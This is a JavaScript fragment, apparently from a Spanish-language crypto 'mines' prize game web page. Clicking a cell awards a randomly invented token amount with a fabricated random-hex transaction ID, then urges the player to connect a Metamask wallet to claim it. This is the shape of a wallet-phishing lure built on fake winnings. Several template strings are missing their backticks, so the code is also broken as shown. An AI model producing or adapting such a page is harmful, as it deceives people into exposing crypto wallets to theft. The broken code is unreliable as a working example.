   const cryptoPrizes = [
            { token: 'USDT', amount: () => (Math.random() * 50 + 10).toFixed(2) },
            { token: 'USDC', amount: () => (Math.random() * 50 + 10).toFixed(2) },
            { token: 'WLD', amount: () => (Math.random() * 5 + 1).toFixed(4) }
        ];

        let attempts = 3;
        let minePosition = Math.floor(Math.random() * 25);
        let revealedCells = new Set();

        function initializeGrid() {
            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            
            for (let i = 0; i < 25; i++) {
                const cell = document.createElement('div');
                cell.className = 'cell';
                cell.dataset.index = i;
                cell.addEventListener('click', handleCellClick);
                grid.appendChild(cell);
            }
        }

function handleCellClick(event) {
  if (attempts <= 0) return;

  const cell = event.target;
  const index = parseInt(cell.dataset.index);

  if (revealedCells.has(index)) return;

  revealedCells.add(index);
  cell.classList.add('revealed');

  if (index === minePosition) {
    setTimeout(() => awardPrize(cell), 800);
  } else {
    attempts--;
    document.getElementById('attempts').textContent = attempts;

    if (attempts === 0) {
     document.getElementById('prize-info').innerHTML = `
  <div class="casino-alert">😢 Sin intentos. ¡Intenta nuevamente!</div>
`;

    }
  }
}

	  
function getWeightedRandomPrize() {
  const weightedPrizes = [
    { token: 'USDT', min: 10, max: 100, weight: 30 },
    { token: 'USDC', min: 5, max: 75, weight: 25 },
    { token: 'WLD', min: 1, max: 10, weight: 20 },
    { token: 'DAI', min: 15, max: 90, weight: 15 },
    { token: 'OP', min: 2, max: 15, weight: 10 }
  ];

  const totalWeight = weightedPrizes.reduce((acc, p) => acc + p.weight, 0);
  const rand = Math.random() * totalWeight;
  let acc = 0;

  for (const prize of weightedPrizes) {
    acc += prize.weight;
    if (rand <= acc) return prize;
  }

  return weightedPrizes[0]; // fallback por seguridad
}


function awardPrize(cell) {
  const selected = getWeightedRandomPrize();
  const amount = (Math.random() * (selected.max - selected.min) + selected.min).toFixed(4);
  const txId = "0x" + [...Array(16)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

  cell.classList.add('mine');
 cell.innerHTML = 
  <div class="token-icon" style="font-size:1.2em; animation: blink 1s infinite;">
    ${selected.token}
  </div>
  <strong style="color:#00ff96">${amount}</strong>
;

cell.style.border = "3px solid gold";
cell.style.boxShadow = "0 0 25px #ffcc00";

  document.getElementById('prize-info').innerHTML = 
    <div class="prize-animation" style="font-size: 1.2em;">
      🎉 <strong>${amount} ${selected.token}</strong> ganados<br>
      <small>TX ID: ${txId}...</small><br><br>
      <div class="casino-alert">🚀 ¡Conecta tu wallet Metamask para reclamar tu premio ahora!</div>
    </div>
  ;

  document.getElementById("winSound").play();
  if (navigator.vibrate) navigator.vibrate([100, 50, 100]);

  updateStats(amount);
  attempts = 0;
  document.getElementById('attempts').textContent = 0;
}



        function findRandomUnrevealedCell() {
            let availableCells = Array.from(document.querySelectorAll('.cell:not(.revealed)'));
            return availableCells[Math.floor(Math.random() * availableCells.length)];
        }

        // Inicialización
        initializeGrid();


	  let winCount = 0;
let totalPrizeValue = 0;
let sessionSeconds = 0;

function updateStats(prizeValue) {
  winCount++;
  totalPrizeValue += parseFloat(prizeValue);
  document.getElementById("wins").textContent = winCount;
  document.getElementById("totalValue").textContent = totalPrizeValue.toFixed(2);
}

setInterval(() => {
  sessionSeconds++;
  const minutes = String(Math.floor(sessionSeconds / 60)).padStart(2, '0');
  const seconds = String(sessionSeconds % 60).padStart(2, '0');
document.getElementById("sessionTime").textContent = ${minutes}:${seconds};
}, 1000);

function addMiniGame() {
  const miniGame = document.getElementById("miniGame");
  miniGame.style.display = "block";
  let clicks = 0;
  document.getElementById("clickCount").textContent = "Clicks: 0";

  const btn = document.getElementById("clickerBtn");
  btn.disabled = false;
  btn.onclick = () => {
    clicks++;
document.getElementById("clickCount").textContent = Clicks: ${clicks};
  };

  setTimeout(() => {
    btn.disabled = true;
alert(¡Hiciste ${clicks} clics!);
  }, 5000);
}




	  
function resetGame() {
  attempts = 3;
  minePosition = Math.floor(Math.random() * 25);
  revealedCells.clear();
  document.getElementById("attempts").textContent = attempts;
  document.getElementById("prize-info").textContent = '';
  initializeGrid();
}

